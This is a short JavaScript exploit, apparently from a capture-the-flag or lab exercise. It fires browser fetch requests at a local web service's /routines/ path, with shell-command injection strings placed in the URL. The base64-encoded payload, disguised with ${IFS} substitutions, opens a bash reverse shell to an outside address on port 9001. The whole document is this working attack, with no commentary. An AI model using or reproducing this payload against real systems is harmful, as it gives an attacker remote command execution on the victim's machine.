const ip = "10.10.16.55";
const payload = "echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41NS85MDAxIDA+JjE=|base64${IFS}-d|bash";

async function triggerShell() {
    const urls = [
        `http://127.0.0.1:80/routines/a[$({${payload}})]`,
        `http://127.0.0.1:80/routines/a';${payload} #`
    ];
    for (const url of urls) {
        fetch(url, { mode: 'no-cors' });
    }
}
triggerShell();